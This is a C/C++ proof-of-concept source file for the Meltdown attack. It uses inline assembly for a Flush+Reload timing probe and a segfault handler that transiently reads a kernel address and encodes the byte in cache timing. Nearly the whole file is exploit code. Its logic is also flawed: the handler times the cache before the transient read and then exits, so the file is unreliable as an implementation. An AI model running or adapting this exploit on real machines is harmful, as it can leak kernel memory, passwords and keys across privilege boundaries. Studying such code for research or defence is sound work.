#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

char* data;

char* addr = reinterpret_cast<char*>(0xffff880000000000);

// See https://eprint.iacr.org/2013/448.pdf
unsigned long probe(char* addr)
{
    volatile unsigned long time;
    asm __volatile__(" mfence                   \n"
                     " lfence                   \n"
                     " rdtsc                    \n"
                     " lfence                   \n"
                     " mov esi, eax             \n"
                     " mov eax, DWORD PTR [%1]  \n"
                     " lfence                   \n"
                     " rdtsc                    \n"
                     " sub eax, esi             \n"
                     " clflush [%1]             \n"
                     : "=a"(time)
                     : "c"(addr)
                     : "esi", "edx");
    return time;
}


static void handler(int sig, siginfo_t* si, void* unused)
{
    printf("Got SIGSEGV at address: 0x%lx\n", (long)si->si_addr);
    
    unsigned long result[256];
    
    for (int i = 0; i < 256; ++i)
        result[i] = probe(&data[i * 4096]);

    for (int i = 0; i < 256; ++i)
        printf("Index: %d Time: %d\n", i, result[i]);

    delete[] data;
    data = new char[256 * 4096];

    
    ++addr;

    // See https://meltdownattack.com/meltdown.pdf
    asm __volatile__("mov rax, 0 \n"
                     "retry_h:  \n"
                     "mov al, BYTE PTR [%0] \n" // Trigger exception
                     "shl rax, 0xc \n"             
                     "jz retry_h \n"
                     "mov rbx, QWORD PTR [%1 + rax] \n"
                     :
                     : "r"(addr), "r"(data)
                     : "rax", "rbx");

    exit(1);
}

int main(int argc, char* argv[])
{
    data = new char[256 * 4096];
    
    // Register segfault handler
    struct sigaction sa;
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1) {
        printf("Failed to register sig handler");
        exit(1);
     }
    
    // Trigger exception.
    // Exception handler will be called
    // First call is useless
    return(addr[0]);
}
